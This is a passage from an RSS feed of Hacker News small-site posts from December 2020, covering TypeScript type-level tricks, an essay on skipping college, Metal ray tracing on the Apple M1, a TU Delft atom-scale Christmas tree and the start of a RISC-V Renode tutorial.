                            T3 <span>extends</span> Something <span>?</span> 1 : <span>0</span>
                        ] <span>extends</span> 
                        [<span>1</span>, <span>1</span>, <span>1</span>] <span>?</span> 
                        1:
                        <span>0</span>;
</code></pre></div>
<h3 id="reason-2">Reason</h3>
<p>You will often need to deeply check a few things, and only execute some logic if all are a certain value. This can result in an annoying deeply nested structure.</p>
<p>One clean solution to this is to check all of them upfront in a tuple and compare that to the expected results of each. Now your tree is only one level deep and your intent is much clearer!</p>
<hr>
<h2 id="dont-distribute-my-union">Donâ€™t Distribute My Union</h2>
<h3 id="example-3">Example</h3>
<div><pre><code data-lang="typescript"><span>// Bad
</span><span></span><span>type</span> StringToObject&lt;<span>T</span>&gt; <span>=</span> T <span>extends</span> <span>string</span> <span>?</span> {[key <span>in</span> T]<span>:</span> <span>boolean</span>} <span>:</span> <span>never</span>;

<span>type</span> UnionToObject&lt;<span>T</span>&gt; <span>=</span> StringToObject&lt;<span>T</span>&gt;;
<span>type</span> Nested&lt;<span>T</span>&gt; <span>=</span> {[key <span>in</span> <span>keyof</span> T]<span>:</span> UnionToObject&lt;<span>T</span>[<span>key</span>]&gt;};

<span>const</span> value: <span>Nested</span><span>&lt;</span>{thing<span>:</span> <span>'a'</span> <span>|</span> <span>'b'</span> <span>|</span> <span>'c'</span>}<span>&gt;</span> <span>=</span> {thing<span>:</span> {a: <span>true</span>, c: <span>true</span>}}; <span>// NO ERROR
</span></code></pre></div>
<div><pre><code data-lang="typescript"><span>// Good
</span><span></span><span>type</span> StringToObject&lt;<span>T</span>&gt; <span>=</span> [T] <span>extends</span> [<span>string</span>] <span>?</span> {[key <span>in</span> T]<span>:</span> <span>boolean</span>} <span>:</span> <span>never</span>;
<span>//                       ^ ^         ^      ^
</span><span></span><span>type</span> UnionToObject&lt;<span>T</span>&gt; <span>=</span> StringToObject&lt;<span>T</span>&gt;;
<span>type</span> Nested&lt;<span>T</span>&gt; <span>=</span> {[key <span>in</span> <span>keyof</span> T]<span>:</span> UnionToObject&lt;<span>T</span>[<span>key</span>]&gt;};

<span>const</span> value: <span>Nested</span><span>&lt;</span>{thing<span>:</span> <span>'a'</span> <span>|</span> <span>'b'</span> <span>|</span> <span>'c'</span>}<span>&gt;</span> <span>=</span> {thing<span>:</span> {a: <span>true</span>, c: <span>true</span>}}; <span>// ERROR Missing 'b'
</span></code></pre></div>
<h3 id="reason-3">Reason</h3>
<p>Sometimes you will pass a union so deeply that when it reaches its final destination the union has been distributed. This <em>can</em> result in unintended behavior as described above. Since the union has been distributed, <code>value</code> in the first example will result in the type</p>
<pre><code>{thing:
    {[key in 'a']:boolean} | 
    {[key in 'b']:boolean} | 
    {[key in 'c']:boolean}
}
</code></pre><p>when your goal was simply <code>{thing: {[key in ('a'|'b'|'c')]:boolean} }</code>.</p>
<p>The solution to this is to wrap <code>T</code> in a tuple to force TypeScript to not distribute your union in subsequent expressions.</p>
<hr>
<h2 id="exclude-never">Exclude <code>never</code></h2>
<h3 id="example-4">Example</h3>
<div><pre><code data-lang="typescript"><span>// Bad
</span><span></span><span>type</span> Bad <span>=</span> {shoes:<span>never</span>; other: <span>boolean</span>}
<span>const</span> value: <span>Bad</span> <span>=</span> {shoes:<span>1</span>, other:<span>true</span>};  <span>// throws an error on shoes but intellisense and type is misleading
</span></code></pre></div>
<div><pre><code data-lang="typescript"><span>// Good
</span><span></span>
<span>export</span> <span>type</span> ExcludeNever&lt;<span>T</span>&gt; <span>=</span> {
    [key <span>in</span> <span>keyof</span> T <span>as</span> T[key] <span>extends</span> <span>never</span> <span>?</span> <span>never</span> <span>:</span> key]<span>:</span> T[key];
};


<span>const</span> value: <span>ExcludeNever</span>&lt;<span>Bad</span>&gt; <span>=</span> {shoes: <span>1</span>, other: <span>true</span>} <span>// throws a full error and no intellisense
</span></code></pre></div>
<h3 id="reason-4">Reason</h3>
<p>Occasionally you will process some type in a <code>Record</code> and set a value to never. This is perfectly valid and will throw errors when the user attempts to put a value there.</p>
<p>The problem is, intellisense does not exclude this key from your result list. Sure the type is <code>never</code>, but since the key still exists it will allow you to put a value there.</p>
<p>The solution is to use the new TypeScript <code>as</code> syntax to set the key to <code>never</code> when appropriate, that way it will not be available to the user.</p>
<p>Note: the end result is the same, you cannot put a value for shoes, but the DX is significantly improved in the second case.</p>
<hr>
<h2 id="potential-solution-to-type-instantiation-is-excessively-deep-and-possibly-infinite">Potential Solution To <code>type instantiation is excessively deep and possibly infinite</code></h2>
<h3 id="example-5">Example</h3>
<div><pre><code data-lang="typescript"><span>// Bad
</span><span></span><span>type</span> GoDeep&lt;<span>T</span>&gt; <span>=</span> <span>/*...*/</span> GoDeep&lt;<span>T</span>&gt;; 
</code></pre></div>
<div><pre><code data-lang="typescript"><span>// Good
</span><span></span><span>type</span> GoDeep&lt;<span>T</span>&gt; <span>=</span> T <span>extends</span> <span>infer</span> R <span>?</span> <span>/*...*/</span> GoDeep&lt;<span>R</span>&gt; <span>:</span> Impossible;
</code></pre></div>
<h3 id="reason-5">Reason</h3>
<p>Now this one is a bit hard to explain, but easily one of the most powerful tricks in this post. It has saved my bacon too many times to count.</p>
<p>The example above is intentionally sparse since itâ€™s hard to find real world examples. <em>When you need it, youâ€™ll know</em>.</p>
<p>Along your journey to making a complex library completely typesafe you will inevitably create a type that is <em>potentially</em> infinitely deeply nested.</p>
<p>A little background: TypeScript has a rule that it will generally not dive deeper than about 50 levels of type checking before it throws up its hands and resolves the dreaded â€œtype instantiation is excessively deep and possibly infiniteâ€. This means your type is too complex and it would take too long to evaluate, so it wont.</p>
<p>I will say that 90% of the time this is due to an issue in your code that is solvable without use of trickery. Typically, you screwed up somewhere. However, on the rare occasion where you did everything right, your type is properly optimized, but your library requirements actually do push the envelope, you can use the above trick.</p>
<p>How it works is still a bit of a mystery to me. This is a trick I learned from the incredible library <a href="https://github.com/millsp/ts-toolbelt">ts-toolbelt</a>. The best I can tell is it <strong>defers</strong> the evaluation of the type T until it is actually requested. What this means is just because your type <strong>can</strong> be nested infinitely, this outcome will be tested <strong>based on usage</strong> rather than a blanket statement.</p>
<p>That means if you pass a T that does exhaust the 50 cap then TypeScript will be sure to let you know, but until then all of the Tâ€™s that play nice will continue to work.</p>
<p>I dont know if the explanation above is correct and would love to be corrected! In my experience and research this is how it works.</p>
<p>
  <img src="https://casualdeveloper.net/img/deep.gif" alt="Deep">

</p>
<hr>
<h2 id="potential-solution-to-excessive-union">Potential Solution To <code>excessive union</code></h2>
<h3 id="example-6">Example</h3>
<div><pre><code data-lang="typescript"><span>type</span> Depths <span>=</span> <span>1</span> <span>|</span> <span>2</span> <span>|</span> <span>3</span> <span>|</span> <span>4</span> <span>|</span> <span>5</span>;

<span>type</span> NextDepth&lt;<span>TDepth</span> <span>extends</span> <span>Depths</span>&gt; <span>=</span> TDepth <span>extends</span> <span>1</span>
  <span>?</span> 2
  : <span>TDepth</span> <span>extends</span> <span>2</span>
  <span>?</span> 3
  : <span>TDepth</span> <span>extends</span> <span>3</span>
  <span>?</span> 4
  : <span>TDepth</span> <span>extends</span> <span>4</span>
  <span>?</span> 5
  : <span>never</span>;

<span>export</span> <span>type</span> SafeTypes <span>=</span> <span>number</span> <span>|</span> <span>string</span> <span>|</span> <span>boolean</span> <span>|</span> <span>Date</span>

<span>export</span> <span>type</span> DeepKeys&lt;<span>T</span> <span>extends</span> {}, <span>TDepth</span> <span>extends</span> <span>Depths </span><span>=</span> <span>1</span>&gt; <span>=</span> TDepth <span>extends</span> <span>5</span>
  <span>?</span> <span>//                                                           ^^ here is the check â€¦</span></code></pre></div></div></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://casualdeveloper.net/post/2020-12-21-advanced-typescript-type-tricks/">https://casualdeveloper.net/post/2020-12-21-advanced-typescript-type-tricks/</a></em></p>]]>
            </description>
            <link>https://casualdeveloper.net/post/2020-12-21-advanced-typescript-type-tricks/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25510594</guid>
            <pubDate>Tue, 22 Dec 2020 20:08:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You can't be â€œnot good enoughâ€ to skip (or drop out of) college]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25510447">thread link</a>) | @kipply
<br/>
December 22, 2020 | https://carolchen.me/blog/no-not-good-enough/ | <a href="https://web.archive.org/web/*/https://carolchen.me/blog/no-not-good-enough/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="js-article">
    
<p>This is a pro-not-going-to-college post in the context of people around the tech industry. It is mostly for people who are entertaining no-college as something that might be good for them. It is not about why or if dropping out is a good idea, and more to air out the idea that not going to school requires some level of skill -- a notion probably brought forth by prolific dropouts. </p>
<p>Most messaging with not going to school along the lines of "there are more important things to work on", "you can learn faster outside of school", "why wait for a degree when you can start working now", or "you could be running a kickass startup instead". All of these are great reasons to not go to school, but they have an implication that you have to be skilled to a certain degree (haha, "degree"). Good enough to have the opportunities to work on more important things. Good enough that school isn't already challenging your learning. Good enough to get a job. Good enough to run a startup. </p>
<p>Most of my conversations with people who are interested in the concept of not going to school have implied that not being good enough is a blocker. Of course, there are other overlapping blockers related to fear, money, privilege, or it simply not being a good choice for your priorities, but I think "not being good enough" is wholy surmountable (provided you're accurately evaluating your own abilities). </p>
<h3 id="doing-the-things-no-one-else-has-had-the-chance-to-do">Doing the things no one else has had the chance to do<a href="#doing-the-things-no-one-else-has-had-the-chance-to-do" aria-label="Anchor link for: doing-the-things-no-one-else-has-had-the-chance-to-do"> <i></i></a>
</h3>
<p>I model ambition/excellence as a spectrum. One end is "getting ahead" and the other end is "getting a bonus". Canonical "getting ahead" would be graduating early, getting promoted quickly and rising to the top of your org in record time. It's hard to describe what "getting a bonus" might be like since it's by nature dependent on things one might not expect to have done. It can be summarized as "doing the things no one else has had the chance to do". </p>
<p>This is a wavy spectrum, and the range shrinks and ambiguities increase when you apply it to any individual. Regardless, I contend that "getting a bonus mentality" helps make it such that one can't be "not good enough" to skip college. </p>
<p>While they're two ends of a spectrum, I think few would argue that both approaches can lead to excellence, success, ambition, or whatever it is you want for yourself. However, with "getting a bonus", there is much less "not good enough" barrier. Instead of getting a job at Google after dropping out, you can work on a side project, take the time to pursue another career path, work at a non-profit or train to climb Mount Everest.</p>
<p>In my first year not going to school, I learned to juggle, taught programming bootcamp and suprised myself by moving to a "city" with less than a million people for my first experience living away from home. The time I saved allowed me to further pursue an interests in the arts I found too late because I was obsessed with getting internships in high school and gave me flexibility to travel. With the money I saved (and employment) I was able to donate over 25% of my pretax income. </p>
<p>Doing the things no one else has the chance to do is easier when outside of school, since you have increased flexibility and range to seek opportunities. Furthermore, this kind of excellence and achievement <em>scales</em>. If you buy that the difficulty to improve at something because exponentially harder, then you should gain more valuable experiences and skills by doing a variety of offbeat things. I don't want this to slip into a jack-of-all-trades-is-the-best-skillset career recommendation. This scalability does apply to your career skills, but it also applies to the values of your experiences, for all axes of "values". </p>
<h3 id="falling-behind">Falling behind<a href="#falling-behind" aria-label="Anchor link for: falling-behind"> <i></i></a>
</h3>
<p>If "getting a bonus" is the opposite of "getting ahead", then certainly that means you fall behind right? Perhaps! But you will have earned four years of doing things that no one else will have had. Given tech, you won't be a full-four years behind in your career, though it's possible you won't be as well off as you would be if you had gone to school. Additionally, I think that not being in school often helps accelerate your "goodness", though that's a separate "why get out of school" post. </p>
<p>Not going to college definitely put me behind in a lot of things. When working on TruffleRuby at Shopify I got burned by not having taking an Operating Systems or Concurrency course. Not having a degree puts me in a very difficult spot in immigrating anywhere (I'm stuck in Canada). It takes out the character I would have built struggling through courseloads (I was not good at high school, I probably would not have been that much better at college and it's unfortunate I may never be able to correct that). It certainly cuts down some my job opportunities. </p>
<p>So yeah, falling behind is a thing. One path is to just accept it with the other less-measurable experiences you have achieved, another is to convince yourself that it's not quite as real as one might think. </p>
<p>Once you get out of school, the different axis on which you can succeed grows quickly. Some may end up caring only about their salary, others on their social lives, others on their ability to start a family. It gets drastically harder to compare who is more successful, if you were even worried about that in the first place. The farther I get away from the school-scene the more apparent it is that I am not behind on valuable experiences.</p>
<hr>
<p>If you are interested in not going to school, then the much harder question is what on earth to do. I don't have many coherent thoughts about this that is suitable as general advice, but if you want to email me at hello@carolchen.me we can chat~</p>
<p>&lt;3, 
Kipply</p>


  </section></div>]]>
            </description>
            <link>https://carolchen.me/blog/no-not-good-enough/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25510447</guid>
            <pubDate>Tue, 22 Dec 2020 19:57:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dive into Ray Tracing Performance on the Apple M1]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25510142">thread link</a>) | @adamnemecek
<br/>
December 22, 2020 | https://www.willusher.io/graphics/2020/12/20/rt-dive-m1 | <a href="https://web.archive.org/web/*/https://www.willusher.io/graphics/2020/12/20/rt-dive-m1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<div>
		
<p>The Apple M1 available in the MacBook Air, MacBook Pro 13â€, and Mac Mini has
been the focus of a ton of benchmarking writeups and blog posts about
the new chip. The performance overall, and especially performance/watt,
that Apple has achieved with the chip is very impressive.
As a ray tracing person, what caught my eye the most was the
performance AnandTech reported in their
<a href="https://www.anandtech.com/show/16252/mac-mini-apple-m1-tested/2">CineBench benchmarks</a>.
These scores were 1.6x higher than I got on my old Haswell desktop and 2x
higher than my new Tiger Lake laptop!
I had also been interested in trying out the new
<a href="https://developer.apple.com/videos/play/wwdc2020/10012/">ray tracing API for Metal</a>
that was announced at WWDC this year,
which bears some resemblance to the DirectX, Vulkan, and OptiX GPU ray tracing APIs.
So, I decided to pick up a Mac Mini to do some testing
on my own interactive path tracing project,
<a href="https://github.com/Twinklebear/ChameleonRT">ChameleonRT</a>,
and to get it running on the new Metal ray tracing API.
In this post, weâ€™ll take a look at the new Metal ray tracing
API to see how it lines up with DirectX, Vulkan, OptiX and Embree,
then weâ€™ll make some fair (and some extremely unfair) ray tracing
performance comparisons against the M1.</p>

<!--more-->



<p><a href="https://github.com/Twinklebear/ChameleonRT">ChameleonRT</a> is an open source
interactive path tracer that Iâ€™ve been working on to learn the different ray tracing APIs,
and to provide an example or starting point for myself and others working with them
in other projects.
ChameleonRT provides backends for the GPU ray tracing APIs:
<a href="https://github.com/Twinklebear/ChameleonRT/tree/master/dxr">DirectX Ray Tracing</a>,
<a href="https://github.com/Twinklebear/ChameleonRT/tree/master/vulkan">Vulkan KHR Ray Tracing</a>,
and <a href="https://github.com/Twinklebear/ChameleonRT/tree/master/optix">OptiX 7</a>.
Through the work discussed in this post, it also has a new
<a href="https://github.com/Twinklebear/ChameleonRT/tree/master/metal">Metal</a> GPU backend.
ChameleonRT also has an <a href="https://github.com/Twinklebear/ChameleonRT/tree/master/embree">Embree backend</a>
for fast multi-threaded and SIMD accelerated ray tracing on CPUs through
<a href="https://www.embree.org/">Embree</a>, <a href="https://ispc.github.io/">ISPC</a>, and <a href="https://github.com/oneapi-src/oneTBB">TBB</a>.
The rendering code in each backend is nearly identical and they produce almost pixel exact outputs,
with some possible small differences due to subtle differences in the ray tracing
libraries or shader languages.</p>

<p>ChameleonRT is different from popular ray tracing benchmark applications like
<a href="https://www.maxon.net/en/cinebench">CineBench</a>, <a href="http://www.luxmark.info/">LuxMark</a>,
and <a href="https://opendata.blender.org/">Blender Benchmark</a>, in that ChameleonRT is
a minimal interactive path tracer. CineBench, LuxMark, and Blender Benchmark are excellent
for getting a full picture of what performance to expect from a production film
renderer, as they are production renderers. However, thereâ€™s a lot more going
on in a production renderer than just ray tracing to support the kind of complex
geometries, materials, and effects used in film; and the large code
bases can be challenging to quickly port to a new architecture or API.
ChameleonRT is the exact opposite, supporting just one geometry type,
triangle meshes, and one material type, the Disney BRDF.
The rest of the code is similarly written to achieve interactive path tracing performance,
though I have tried to balance this with how complex the code is to read.
For example, the renderers use iterative ray tracing instead of recursion,
support only a simple sampling strategy, and donâ€™t support alpha cut-out effects.
The use of iterative ray tracing is valuable on both the CPU and GPU, but is
especially important on the GPU, as the
overhead of recursive ray tracing calls in the pipeline can have a significant performance impact.
Similarly, ignoring alpha cut-out effects allows the GPU renderers
to skip using an any hit shader (and the Embree on to skip needing an intersection
filter). The any hit shader (or intersection filter) would be called during
BVH traversal after a candidate intersection with a triangle is found.
In the case that the BVH traversal is hardware accelerated, this ends up
producing a lot amount of back and
forth between the fixed function traversal hardware and the shader cores to run the any hit
shader during traversal, limiting the hardwareâ€™s performance.</p>

<blockquote>
  <p>Whatâ€™s a path tracer? Path tracing is a technique in computer graphics for
rendering photo-realistic images by simulating the light transport in
the scene. It is a Monte Carlo technique, meaning that it randomly samples
light paths emitted from lights in the scene that reach the camera
by bouncing off objects in the scene. This is done by tracing the paths in reverse,
starting from the camera and tracing the path back through the scene.
A large number of light paths need to be sampled to produce a noise-free
image. Path tracing is not restricted to photo-realism, and is the
core rendering algorithm used in major film renderers, such as: Pixarâ€™s Renderman,
Disneyâ€™s Hyperion, Autodeskâ€™s Arnold, and Wetaâ€™s Manuka.
See <a href="https://en.wikipedia.org/wiki/Path_tracing">Wikipedia</a> for more.</p>
</blockquote>



<p>The new ray tracing API in Metal will be familiar to those whoâ€™ve used inline ray
tracing in DirectX or Vulkan. For a good introduction to Metalâ€™s API, check out the <a href="https://developer.apple.com/videos/play/wwdc2020/10012/">Discover ray tracing
with Metal</a> video from WWDC 2020,
and the <a href="https://developer.apple.com/documentation/metal/accelerating_ray_tracing_using_metal?language=objc">accompanying sample</a>.
Inline ray tracing allows applications to make ray tracing calls in any shader stage,
e.g., fragment/pixel shaders, vertex shaders, compute shaders, etc.
Inline ray tracing allows ray tracing effects, for example accurate reflections and shadows,
to be integrated into the regular rasterization pipeline.
Inline ray tracing can also be used from a compute shader to implement a standalone
path tracing based renderer. ChameleonRT is a standalone path tracer, and takes
the compute shader approach for Metal.</p>

<p>At a high-level, ray tracing in Metal proceeds as follows: you upload your
geometry data, build bottom-level primitive acceleration structures over them, then create instances
referencing those acceleration structures and build a top-level acceleration structure over
the instances.
To render the scene you dispatch a compute shader and trace rays against the top-level
acceleration structure to get back intersection results. The intersection results provide
you with the intersected primitive and geometry IDs, and if using instancing, the instance ID.
Your shader can then look up the geometry data for the object that was hit and shade it,
after which it can continue tracing the path.</p>

<p>At this time Metal only supports inline ray tracing, in contrast to DirectX and Vulkan, which
also provide support for ray tracing pipelines. Ray tracing pipelines are used
to implement standalone ray tracing renderers, and is the approach ChameleonRT
uses in its DirectX and Vulkan backends.
OptiX only supports ray tracing pipelines.
Ray tracing pipelines require the creation of a Shader Binding Table to
provide the API with a table of functions to call when specific objects
in the scene are intersected. The SBT can be difficult to setup and debug,
and is a common point of difficulty for developers learning these APIs.
For more information about the SBT, check out my post
<a href="https://www.willusher.io/graphics/2019/11/20/the-sbt-three-ways">â€œThe RTX Shader Binding Table Three Waysâ€</a>.
However, the potential benefit of the SBT is that the GPU can reorder or group function
calls to reduce thread divergence. With inline ray tracing, the developer
must do this themselves, or do without
(check out another video from <a href="https://developer.apple.com/videos/play/wwdc2020/10013/">WWDC20</a>
for information here).
Right now, ChameleonRT does not do any reordering to reduce divergence.</p>

<p>Those familiar with Metal may know of the previous
<a href="https://developer.apple.com/documentation/metalperformanceshaders/metal_for_accelerating_ray_tracing?language=objc">Metal Performance Shaders ray intersector</a>.
The new support for inline ray tracing improves on this by allowing the renderer
to move entirely to the GPU. The previous ray intersector worked by taking
batches of rays, finding intersections in the scene, and writing these results
back out to memory. Multiple compute shaders would need to be dispatched to
trace the primary rays and create shadow and secondary rays, then trace the shadow rays
and continue the secondary rays while filtering out paths that terminated.
This requires significantly more memory traffic and compute dispatches, introducing overhead
to the renderer. Such an approach is also not well suited to augmenting traditional
rasterization pipelines with ray tracing effects.
Approaches based on tracing and sorting rays and intersection information to extract
coherence are valuable for complex film renderers, and can be implemented efficiently using inline
ray tracing as well.
For example, <a href="https://www.yiningkarlli.com/projects/hyperiondesign.html">Disneyâ€™s Hyperion renderer</a>
uses sorting and batching extensively to
extract coherent workloads from an otherwise incoherent and divergent distribution of rays.
Thereâ€™s also an excellent higher-level <a href="https://youtu.be/frLwRLS_ZR0">video</a> explaining how this
works.</p>

<p>The Metal ray tracing API is quite nice to work with.
It bears a lot of similarity to the other ray tracing APIs, but has been streamlined
to be easier to use.
For example, compare the code required to build and compact a BVH in
<a href="https://github.com/Twinklebear/ChameleonRT/blob/master/dxr/dxr_utils.cpp#L877-L977">DirectX</a>
or <a href="https://github.com/Twinklebear/ChameleonRT/blob/master/vulkan/vulkanrt_utils.cpp#L46-L214">Vulkan</a>
with <a href="https://github.com/Twinklebear/ChameleonRT/blob/master/metal/metalrt_utils.mm#L318-L396">Metal</a>.
OptiXâ€™s API provides a similar simplification, hereâ€™s the
<a href="https://github.com/Twinklebear/ChameleonRT/blob/master/optix/optix_utils.cpp#L183-L244">BVH build in OptiX</a>
for reference.
Itâ€™s also nice to have templates and C++ style functionality in the shader language,
a feature Metal shares with OptiX, which uses CUDA for the device side code.</p>

<p>This simplicity also has some drawbacks. For example, while in DirectX, Vulkan, and OptiX
you have control over where the acceleration structure memory is allocated,
Metal makes this allocation for you. As a result, you cannot allocate the acceleration
structures on a <code>MTLHeap</code>, and so to make sure theyâ€™re available for your rendering
pipeline, you must individually mark them as used in a loop instead of a single <code>useHeap</code> call.</p>

<figure><pre><code data-lang="objc"><span></span><span>// Use our top level acceleration structure</span>
<span>[</span><span>command_encoder</span> <span>setAccelerationStructure</span><span>:</span><span>bvh</span><span>-&gt;</span><span>bvh</span> <span>atBufferIndex</span><span>:</span><span>1</span><span>];</span>
<span>// Also mark all mesh acceleration structures used, as they're indirectly</span>
<span>// referenced by the top level one</span>
<span>for</span> <span>(</span><span>auto</span> <span>&amp;</span><span>mesh</span> <span>:</span> <span>bvh</span><span>-&gt;</span><span>meshes</span><span>)</span> <span>{</span>
    <span>[</span><span>command_encoder</span> <span>useResource</span><span>:</span><span>mesh</span><span>-&gt;</span><span>bvh</span> <span>usage</span><span>:</span><span>MTLResourceUsageRead</span><span>];</span>
<span>}</span></code></pre></figure>

<p>This can add some overhead if you have a lot of bottom level BVHs, as can be the
case in scenes with many instances.
Itâ€™d be nice to be able to allocate the acceleration structures on a heap, and replace this loop
with a single <code>[command_encoder useHeap:data_heap-&gt;heap];</code></p>

<p>The API is also simplified significantly by not including ray tracing pipelines and
only requiring a Shader Binding Table-esque
structure when implementing custom geometries or other operations that need
to happen â€¦</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.willusher.io/graphics/2020/12/20/rt-dive-m1">https://www.willusher.io/graphics/2020/12/20/rt-dive-m1</a></em></p>]]>
            </description>
            <link>https://www.willusher.io/graphics/2020/12/20/rt-dive-m1</link>
            <guid isPermaLink="false">hacker-news-small-sites-25510142</guid>
            <pubDate>Tue, 22 Dec 2020 19:31:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mark Rober (former NASA) launches a 30 day Creative Engineering Class]]>
            </title>
            <description>
<![CDATA[
Score 133 | Comments 86 (<a href="https://news.ycombinator.com/item?id=25509619">thread link</a>) | @O_H_E
<br/>
December 22, 2020 | https://monthly.com/mark-rober-engineering | <a href="https://web.archive.org/web/*/https://monthly.com/mark-rober-engineering">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://monthly.com/mark-rober-engineering</link>
            <guid isPermaLink="false">hacker-news-small-sites-25509619</guid>
            <pubDate>Tue, 22 Dec 2020 18:41:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Periodic Table of Visualization Methods]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25509609">thread link</a>) | @fallenatreus
<br/>
December 22, 2020 | https://letsandeepio.github.io/viz-method-table/ | <a href="https://web.archive.org/web/*/https://letsandeepio.github.io/viz-method-table/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://letsandeepio.github.io/viz-method-table/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25509609</guid>
            <pubDate>Tue, 22 Dec 2020 18:40:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[4nm tall Christmas tree is the worldâ€™s smallest one]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25509600">thread link</a>) | @giuliomagnifico
<br/>
December 22, 2020 | https://www.tudelft.nl/en/2020/tnw/tu-delft-physics-student-makes-worlds-smallest-christmas-tree/ | <a href="https://web.archive.org/web/*/https://www.tudelft.nl/en/2020/tnw/tu-delft-physics-student-makes-worlds-smallest-christmas-tree/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    
                        <p><strong>Every year, people all over the world try to make the biggest artificial Christmas tree. Like the Gubbio Christmas Tree, formed by thousands of lights on the slopes of Mount Ingino. Or the illumination of the 372-metre high transmission mast at Lopik in The Netherlands. Maura Willems, a student of Applied Physics at Delft University of Technology (TU Delft), decided to do the opposite.&nbsp; She created what is probably the worldâ€™s smallest Christmas tree.</strong></p><p>For her graduation, Willems works with a scanning tunneling microscope: a complex device that is capable of scanning individual atoms and even changing their position. She uses this microscope to build small structures, literally atom by atom, in order to study their quantum mechanical properties.</p><p>But sometimes you can also use technology for something more fun. Willems came up with the idea of making a Christmas tree by removing 51 atoms from a perfect crystal lattice. The tree is exactly 4 nanometers tall, or 4 millionths of a millimeter. But that is, admittedly, without counting the tree-topper.</p><div id="c701136"><div data-namespace-typo3-fluid="true">

    
            
        
            <div>
                <div>
                    
                        <div id="c701138">


		<p><a href="https://d1rkab7tlqy5f1.cloudfront.net/News/2020/12_December/TNW/KleinsteKerstboom.jpg" data-imagezoom="" data-width="2094" data-height="2094">
							
	
			
	
			<img src="https://d1rkab7tlqy5f1.cloudfront.net/News/2020/12_December/TNW/KleinsteKerstboom.jpg" width="2094" height="2094" alt="">
		

		

						</a>
					
			
	

	

				
		</p>
	








</div>
                    
                </div>
                <div>
                    
                        <div id="c701139">


		<p><a href="https://d1rkab7tlqy5f1.cloudfront.net/News/2020/12_December/TNW/MauraWillems.jpg" data-imagezoom="" data-width="1600" data-height="1600">
							
	
			
	
			<img src="https://d1rkab7tlqy5f1.cloudfront.net/News/2020/12_December/TNW/MauraWillems.jpg" width="1600" height="1600" alt="">
		

		

						</a>
					
			
	

	

				
		</p>
	








</div>
                    
                </div>
            </div>
        
    
        

    
</div></div>
                    
                </div></div>]]>
            </description>
            <link>https://www.tudelft.nl/en/2020/tnw/tu-delft-physics-student-makes-worlds-smallest-christmas-tree/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25509600</guid>
            <pubDate>Tue, 22 Dec 2020 18:40:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using Predictive Power Score to Pinpoint Non-Linear Correlations]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25509560">thread link</a>) | @danielmp1202
<br/>
December 22, 2020 | https://www.narrativetext.co/data-hub/using-predictive-power-score-to-pinpoint-non-linear-correlations | <a href="https://web.archive.org/web/*/https://www.narrativetext.co/data-hub/using-predictive-power-score-to-pinpoint-non-linear-correlations">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><img src="https://www.narrativetext.co/assets/application/160x160/img3.jpg" alt="Image Description"></p><h2>Join our private community in Slack</h2>
          <p>
            Keep up to date by participating in this global community of data
            scientists. We talk about data science use cases, we share notebooks,
            we participate in data science competitions, we help each other,
            and we share new ML techniques and much more!
          </p>
        </div></div>]]>
            </description>
            <link>https://www.narrativetext.co/data-hub/using-predictive-power-score-to-pinpoint-non-linear-correlations</link>
            <guid isPermaLink="false">hacker-news-small-sites-25509560</guid>
            <pubDate>Tue, 22 Dec 2020 18:36:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Baremetal RISC-V Renode â€“ Part 1: Blinky]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25509538">thread link</a>) | @homarp
<br/>
December 22, 2020 | https://blog.y2kbugger.com/baremetal-riscv-renode-1.html | <a href="https://web.archive.org/web/*/https://blog.y2kbugger.com/baremetal-riscv-renode-1.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
        <!-- Google Photos Album: https://photos.app.goo.gl/LUXeip6Xz85QRTn78
https://www.youtube.com/watch?v=D0VuYe77Wu0&list=PLb-MsRpo_wlLW0EWRpAqnbbDsf4kxSI1x -->

<div id="background">
<h2><a href="#id4">Background</a></h2>
<p>I'm exploring the line between hardware and software by creating a series of demos within a minimal, free and open source environment. These demos span from blinking an LED to implementing a toy operating system. The goal is to minimize parts of the system that we take for granted and gain a better understanding of computers and operating systems.</p>

<div id="what-is-risc-v">
<h3><a href="#id6">What is RISC-V?</a></h3>
<p>RISC-V is an open alternative to ARM or x86.</p>
<p>Wikipedia</p>
<blockquote>
RISC-V (pronounced "risk-five") is an open standard instruction set architecture (ISA) based on established reduced instruction set computer (RISC) principles. Unlike most other ISA designs, the RISC-V ISA is provided under open source licenses that do not require fees to use.</blockquote>
</div>
<div id="what-is-renode">
<h3><a href="#id7">What is Renode?</a></h3>
<p>Renode is a simulator designed for embedded firmware. What sets it apart is the goal of not only emulating CPUs and SOCs, but also entire boards with peripherals such as ethernet and even multi-node networks of devices.</p>
